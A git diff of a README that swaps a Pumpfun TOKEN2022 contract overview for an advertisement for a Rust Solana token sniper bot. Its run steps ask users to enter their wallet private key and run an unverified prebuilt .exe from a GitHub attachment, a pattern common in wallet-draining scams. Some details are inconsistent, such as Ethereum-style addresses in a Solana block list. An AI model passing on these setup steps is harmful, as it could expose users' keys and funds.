@@ -1,68 +1,129 @@
-# TOKEN2022 - Pumpfun Smart Contract Overview
+# Solana Ultra-Fast New Token Sniper with Jito Shred Stream 🚀⚡
 
-This document outlines the intricacies of the Pumpfun smart contract that utilizes the new SPL token standard, TOKEN2022. This advanced token protocol extends the functionalities of conventional SPL tokens, providing developers with more versatile options for implementing tokenomics in decentralized applications.
+## Overview
 
-## Why Choose TOKEN2022
+Introducing the **Solana Ultra-Fast New Token Sniper** powered by **Jito Shred Stream** and written in **Rust** 🦀. This cutting-edge sniper detects newly launched tokens on **Raydium** and **Pump.fun** and executes buys at unprecedented speeds using Jito's low-latency shred streaming technology. Built with Rust for maximum performance, memory safety, and security. The ultimate tool for both novice and experienced traders seeking the competitive edge.
 
-TOKEN2022 represents a significant evolution of the SPL token program, offering various additional functionalities beyond what traditional SPL tokens can provide. These enhancements may include features such as tax handling, programmatic governance, or custom fee structures, which can facilitate more sophisticated financial operations within decentralized ecosystems.
+---
 
+## Key Features
 
-## Development Environment
+### ⚡ Jito Shred Stream Integration
+- **Bleeding-Edge Speed**: Harness the power of **Jito Shred Stream** for the fastest possible transaction detection and execution. Get ahead of the competition with direct shred-level data access!
 
-### Devnet Program Addresses
+### 🚀 Unmatched Performance
+- **Lightning-Quick Transactions**: Leveraging Rust's exceptional performance combined with Jito Shred Stream, snipe new tokens in the same block. Zero delays, maximum opportunities!
 
-**Pumpfun + Raydium CLMM**
+### 🔒 Safety First
+- **Robust Security**: Rust's safety guarantees minimize bugs and vulnerabilities, ensuring your trading activities are secure. Trade with confidence and peace of mind.
+
+### 📊 Multiple gRPC Connections
+- **Stay Updated**: Effortlessly connect to top Solana data providers like **Helius** and **Yellowstone** through multiple gRPC connections. Get real-time updates and make informed trading decisions.
+
+### 👩‍💻 User-Friendly Interface
+- **Intuitive Design**: Our sniper bot features a clean and accessible interface, making it easy for users of all experience levels to navigate. Start trading in no time!
+
+### 🛠️ Rich Utilities
+- **Advanced Features**:
+  - **jito-shred-stream**: Access raw shred data for the fastest possible transaction detection.
+  - **jito-confirm**: Engage in low-latency transactions on platforms like Raydium and Pumpfun.
+  - **jito-bundle**: Bundle buy/sell actions with up to **20 wallets** in Raydium/Pumpfun, enhancing your trading strategy and flexibility.
+
+---
+
+## Directory Structure
+
 ```
-Fu6WXgEQeVBrsvHbwh8vStwLxjA12E9KYjPzXnJ1sQC7
+src/
+├── core/
+│   ├── token.rs        # Token definitions and handling
+│   └── tx.rs        # Transaction handling
+| 
+├── engine/
+│   ├── swap.rs        # Token swap(buy/sell) functionalities in various Dexs
+│   └── monitor        # New token monitoring(and parse tx) in Dexs using geyser rpc, and normal rpc
+│       └── helius.rs        # Helius gRpc for tx listen and parse.
+│       └── yellowstone.rs        # Yellowstone gRpc for tx listen and parse.
+|
+├── dex/
+│   ├── pump_fun.rs        # Pump.fun
+│   ├── raydium.rs        # Raydium
+│   ├── meteora.rs        # Meteora
+│   └── orca.rs        # Orca
+│
+├── services/
+│   ├── jito.rs        # Jito service provides ultra-fast transaction confirmation
+│   ├── nozomi.rs        # Jito service provides ultra-fast transaction confirmation
+│   ├── zeroslot.rs        # Jito service provides ultra-fast transaction confirmation
+│   └── nextblock.rs        # NextBlock service provides the ultra-fast transaction confirmation in unique way
+|
+├── common/
+│   ├── logger.rs        # Logs to be clean and convenient to monitor.
+│   └── utils.rs        # Utility functions used across the project
+│
+├── lib.rs
+└── main.rs
 ```
+---
+## Trial Versions
 
-**Pumpfun + Raydium CPMM**
+### **Solana Pumpfun Sniper - Jito Shredstream (Demo)**  
+> 🗂️ [pumpfun_sniper_jitoshred_demo.zip](https://github.com/user-attachments/files/23825331/pumpfun_sniper_jitoshred_demo.zip)
+
+**Strategy Details:**
+- **Entry Trigger:** Monitor user purchases of the new tokens on Dex; execute a buy order upon detection.
+- **Exit Trigger:** Monitor user sales of tokens by checking tp/sl; execute a sell order upon detection.
+- **Time Limitation:** If a position remains open for more than 60 seconds, initiate an automatic sell.  
+*(Note: The tp/sl, as well as the 60-second time limit, are adjustable parameters via environment settings.)*
+---
+
+### How To Run
+1. Environment Variables Settings
+```plaintext
+PRIVATE_KEY= # your wallet priv_key
+RPC_API_KEY= #your helius rpc api-key (Please use premium version that has Geyser Enhanced Websocket)
+SLIPPAGE=10
+JITO_BLOCK_ENGINE_URL=https://ny.mainnet.block-engine.jito.wtf
+JITO_TIP_VALUE=0.00927
+TIME_EXCEED=60 # seconds; time limit for volume non-increasing
+TOKEN_AMOUNT=0.0000001 # token amount to purchase
+TP=3 #3 times
+SL=0.5 #50 percentage
 ```
-GY4gideNhYWJLkgxDW7q9hS6U2SrKb9AmSUbJPsWhEKB
+2. Add the wallet address you want to block on a new line and save the file.
 ```
+0x1234567890abcdef1234567890abcdef12345678
+0xabcdef1234567890abcdef1234567890abcdef12
+```
+3. Run `pumpfun_sniper_jitoshred_demo.exe`.
 
-## Operational Procedures
+---
+### Test Result: Same Block
+![2-22-2025-09-41](https://github.com/user-attachments/assets/2ded6e35-7575-491e-ac43-5f463b0b9cba)
 
-### 1. Creating a Token Pool in Pumpfun
+- Detect: https://solscan.io/tx/5o7ajnZ9CRf7FBYEvydu8vapJJDWtKCvRFiTUBmbeu2FmmDhAQQy3c9YFFhpTucr2SZcrf2aUsDanEVjYgwN9kBc
+- Bought: https://solscan.io/tx/3vgim3MwJsdtahXqfW2DrzTAWpVQ8EUTed2cjzHuqxSfUpfp72mgzZhiVosWaCUHdqJTDHpQaYh5xN7rkHGmzqWv
+- Dexscreener: https://dexscreener.com/solana/A1zZXCq2DmqwVD4fLDzmgQ3ceY6LQnMBVokejqnHpump
 
-A pool can be initialized in Pumpfun by minting new TOKEN2022 tokens. This process is critical for creating a liquidity pool that can facilitate token swapping.
+---
+## Donate
 
-- **Pool Creation Transaction:**
-  [View Transaction](https://solana.fm/tx/5QYCTaGHaareH5CoCMDeDCSxq785BfdMhKmbeKWizq7uAeVptkAuyY8N1QSc78N8YPKLi3fXTZxAfPMdzy76jT25?cluster=devnet-solana)
+👉👌 6vT7nrqtbXDWVc8cRUtifxgfDZi19aW7qhcZg2hSepwb
 
-### 2. Purchasing TOKEN2022
+---
+## Recommended Server Platforms
 
-Users can purchase TOKEN2022 through the Pumpfun platform, which incorporates transaction fees for tax and platform swap operations.
+For optimal performance with Jito Shred Stream, we recommend using a dedicated server located in **New York (NY)** from one of these providers:
 
-- **Purchase Transaction:**
-  [View Transaction](https://solana.fm/tx/5unyZ9MekJeE8EULD4x9JKiNNCShfMnpk5edJzLpEMB6AY9g449an1y5hWmHkkJ8hwGCfpaVnb6TWL3SeqH14EYx?cluster=devnet-solana)
+| Provider | Website |
+|----------|---------|
+| **Cherry Servers** | [cherryservers.com](https://www.cherryservers.com) |
+| **Teraswitch** | [teraswitch.com](https://teraswitch.com) |
+| **Latitude.sh** | [latitude.sh](https://www.latitude.sh) |
 
-### 3. Selling TOKEN2022
+> 💡 **Tip**: Low-latency NY servers are critical for maximizing Jito Shred Stream performance and achieving same-block execution.
 
-The Pumpfun platform allows users to sell TOKEN2022. Similar to the buying process, selling involves associated transaction fees.
+---
+## Support
 
-- **Sale Transaction:**
-  [View Transaction](https://solana.fm/tx/2Wt2YhkU5Bj6kY9hgSLaPZ6AkjxsRZrijax59f9kRQo9fD61SkjhXPd587RTt9SDDQ4cdYNMySMBKZ5L5TJqYmyp?cluster=devnet-solana)
-
-### 4. Liquidity Migration to Raydium CLMM 
-
-After operating on Pumpfun, liquidity can be removed to migrate to the Raydium constant product market maker (CPMM) or constant product automated market maker (CLMM).
-
-- **Liquidity Removal Transaction:**
-  [View Transaction](https://solana.fm/tx/uX492XUVW7yEtxyxSyhqDm7jngB7xtr23Sh29WhVfHR88JuSDwyC387XDE69k4Q8dzPbfYGDeX2hMHsRMQg2LLH?cluster=devnet-solana)
-
-### 5. Liquidity Migration to Raydium CPMM
-
-After liquidity removal from Pumpfun, it can be migrated to Raydium CPMM through a dedicated migration operation.
-
-- **Migration Transaction:**
-  [View Transaction](https://solana.fm/tx/5iHdBwV2d9RsqmawRuUSRiJfb5k22ooZTpCJhigBiXpYrbep7pK4rYKyq2MQgtiSYYTzsDB1wKtrmtx45K93D7p5?cluster=devnet-solana)
-
-## Conclusion
-
-By leveraging TOKEN2022 and the Pumpfun smart contract, developers can build robust decentralized applications with enhanced token functionalities. The outlined procedures demonstrate how to effectively engage with the Pumpfun platform while utilizing the Raydium ecosystem for improved liquidity management.
-
-## Troubleshooting
-
-It is not representing the basic code so if you have any issue during the run of this repo, feel free to open issues.
-Or contact here: [telegram](https://t.me/soulcrancerdev)
+For support and further inquiries, please connect via Telegram.
